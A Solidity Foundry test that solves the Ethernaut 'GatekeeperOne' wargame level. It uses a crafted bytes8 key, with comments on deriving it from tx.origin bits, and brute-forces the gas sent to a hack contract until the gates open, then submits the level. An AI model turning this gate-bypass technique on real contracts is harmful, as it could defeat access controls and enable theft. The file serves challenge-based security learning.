//SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";

import "ethernaut/Ethernaut.sol";
import "ethernaut/GatekeeperOne/GatekeeperOneFactory.sol";
import "ethernaut/GatekeeperOne/GatekeeperOneHack.sol";

contract GatekeeperOneTest is DSTest {
//state variables
   Vm vm = Vm(address(HEVM_ADDRESS));
   Ethernaut ethernaut;
   
  
   //setup the state variables
   function setUp() public {
       ethernaut = new Ethernaut();
       
   }

   //level setup, attack, submission
   function testGatekeeperOneHack() public {
       //LEVEL SETUP
    GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
    ethernaut.registerLevel(gatekeeperOneFactory);
    vm.startPrank(tx.origin);

    address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
    //GatekeeperOne gatekeeperOneContract = GatekeeperOne(payable(address(levelAddress)));

    //LEVEL ATTACK
    GatekeeperOneHack gatekeeperOneHackContract = new GatekeeperOneHack(payable(address(levelAddress)));
    
    //@notice ? can be any desired number
    //@notice 1 hex code == 4 bits
    //gate3 conditon 1: Last 8 hex codes(32 bits) should be equal to the last 4 hex codes(16 bits)
    // i.e 0x0000???? == 0x????
    //gate3 condition 2: Last 8 hex codes(32 bits) should not be equal to the last 16 hex codes(64 bits)
    //i.e 0x0000???? == 0x000000000000???? therefore make it 0x?00000000000????
    //gate3 condition 3: Last 8 hex codes(32 bits) should be equal to the last 4 hex code of your tx.origin
    //i.e 0x0000???? == 0x????(of your tx.origin)

    bytes8 gateKey = 0x100000000000ea72;
    uint mod = 8191;
    uint gasToUse = 70000;

    for(uint i = 0; i < mod; ++i) {
      try gatekeeperOneHackContract.attack(gateKey, gasToUse + i) {
        emit log_named_uint('Gate2 Pass', gasToUse + i);
        break;

      }
      catch{}
    }
    



   

   

    //LEVEL SUBMISSION
    bool challengeCompleted = ethernaut.submitLevelInstance(
        payable(levelAddress)
    );
    vm.stopPrank(); 
    assert(challengeCompleted);

   }
}